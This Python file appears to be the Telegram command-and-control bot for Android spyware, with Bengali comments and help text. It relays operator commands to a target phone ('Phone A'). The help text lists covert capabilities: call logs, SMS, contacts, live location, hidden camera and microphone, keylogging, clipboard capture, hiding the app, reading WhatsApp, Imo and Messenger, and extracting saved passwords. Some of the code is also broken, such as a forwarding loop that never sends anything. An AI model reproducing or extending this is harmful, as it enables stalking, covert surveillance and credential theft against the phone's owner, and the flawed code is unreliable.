import telebot
import time

# ============ কনফিগারেশন ============
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # ← আপনার টোকেন দিন
PHONE_A_ID = "YOUR_CHAT_ID_HERE"   # ← আপনার চ্যাট আইডি দিন

bot = telebot.TeleBot(BOT_TOKEN)

# ============ কমান্ড লিস্ট ============
COMMANDS = [
    'start', 'help',
    'call_log', 'call_log_3months', 'missed_calls', 'outgoing_calls', 'call_log_number',
    'sms_list', 'send_sms', 'call',
    'contacts',
    'location', 'live_location', 'location_history',
    'device_info', 'imei', 'sim_check', 'sim_swap',
    'lock', 'unlock', 'screenshot', 'screen_record', 'hide_app', 'show_msg',
    'lockdown', 'unlock_phone', 'say',
    'start_mic', 'stop_mic', 'live_mic',
    'front_camera', 'back_camera', 'live_camera',
    'battery', 'storage', 'ram', 'netspeed', 'app_usage', 'running_apps', 'installed_apps',
    'wifi', 'bluetooth', 'airplane',
    'brightness', 'volume', 'tap',
    'clipboard', 'start_keylog', 'clipboard_log',
    'files', 'gallery', 'backup',
    'breach_search', 'truecaller',
    'whatsapp', 'imo', 'messenger', 'telegram',
    'get_passwords'
]

# ============ হ্যান্ডলার ============
@bot.message_handler(commands=COMMANDS)
def handle_commands(message):
    cmd = message.text
    bot.send_message(PHONE_A_ID, cmd)
    bot.reply_to(message, f"✅ কমান্ড পাঠানো হয়েছে: {cmd}")

@bot.message_handler(func=lambda m: m.text.startswith('/'))
def handle_unknown(message):
    bot.reply_to(message, "❓ অজানা কমান্ড\n/help দেখুন")

@bot.message_handler(commands=['help'])
def send_help(message):
    help_text = """
🤖 *কন্ট্রোল বট - হেল্প গাইড*

📞 *কল সংক্রান্ত*
/call_log - ৩০ দিনের কল লিস্ট
/call_log_3months - ৯০ দিনের কল লিস্ট
/missed_calls - মিসড কল
/outgoing_calls - আউটগোয়িং কল
/call_log_number 017xxx - নির্দিষ্ট নাম্বার

✉️ *এসএমএস*
/sms_list - এসএমএস লিস্ট
/send_sms 017xxx মেসেজ - এসএমএস পাঠান
/call 017xxx - কল করুন

📋 *কন্ট্যাক্ট*
/contacts - কন্ট্যাক্ট লিস্ট

📍 *লোকেশন*
/location - বর্তমান লোকেশন
/live_location - লাইভ লোকেশন
/location_history - লোকেশন হিস্ট্রি

📱 *ডিভাইস তথ্য*
/device_info - ডিভাইস তথ্য
/imei - IMEI নাম্বার
/sim_check - সিম তথ্য

🔒 *স্ক্রিন কন্ট্রোল*
/lock - স্ক্রিন লক
/unlock - স্ক্রিন চালু
/screenshot - স্ক্রিনশট
/screen_record - স্ক্রিন রেকর্ড
/hide_app - অ্যাপ লুকান
/show_msg টেক্সট - স্ক্রিনে মেসেজ

🔒 *লকডাউন মোড*
/lockdown - পুরো ফোন লক
/unlock_phone - লকডাউন বন্ধ
/say টেক্সট - ফোন A থেকে কথা বলা

🎙️ *অডিও*
/start_mic - রেকর্ড শুরু
/stop_mic - রেকর্ড বন্ধ
/live_mic - লাইভ মাইক

📷 *ক্যামেরা*
/front_camera - সামনের ক্যামেরা
/back_camera - পেছনের ক্যামেরা
/live_camera - লাইভ ক্যামেরা

🔋 *সিস্টেম*
/battery - ব্যাটারি
/storage - স্টোরেজ
/ram - র‍্যাম
/netspeed - নেট স্পিড
/running_apps - চলমান অ্যাপ
/installed_apps - ইনস্টলড অ্যাপ

🌐 *নেটওয়ার্ক*
/wifi on/off - ওয়াইফাই
/bluetooth on/off - ব্লুটুথ
/airplane on/off - এয়ারপ্লেন

⚙️ *কন্ট্রোল*
/brightness 50 - ব্রাইটনেস
/volume 5 - ভলিউম
/tap x,y - ট্যাপ

⌨️ *কিলগ*
/start_keylog - কিলগ শুরু

📁 *ফাইল*
/files - ফাইল লিস্ট
/backup - ব্যাকআপ

🔍 *সার্চ*
/breach_search 017xxx - ব্রিচ সার্চ
/truecaller 017xxx - Truecaller

💬 *মেসেজিং*
/whatsapp - WhatsApp বার্তা
/imo - Imo বার্তা
/messenger - Messenger বার্তা

🔐 *পাসওয়ার্ড*
/get_passwords - সেভ করা পাসওয়ার্ড

❓ *হেল্প*
/help - এই মেসেজ
    """
    bot.reply_to(message, help_text, parse_mode='Markdown')

# ফোন A থেকে আসা সব মেসেজ ফরওয়ার্ড
@bot.message_handler(func=lambda m: str(m.chat.id) == PHONE_A_ID)
def forward_from_phone_a(message):
    for chat_id in [PHONE_A_ID]:
        if str(chat_id) != PHONE_A_ID:
            bot.send_message(chat_id, message.text)

# ============ বট চালু ============
if __name__ == "__main__":
    print("🤖 টেলিগ্রাম বট চালু হচ্ছে...")
    print(f"📱 ফোন A-র চ্যাট আইডি: {PHONE_A_ID}")
    print("=" * 40)
    while True:
        try:
            bot.infinity_polling(timeout=60)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)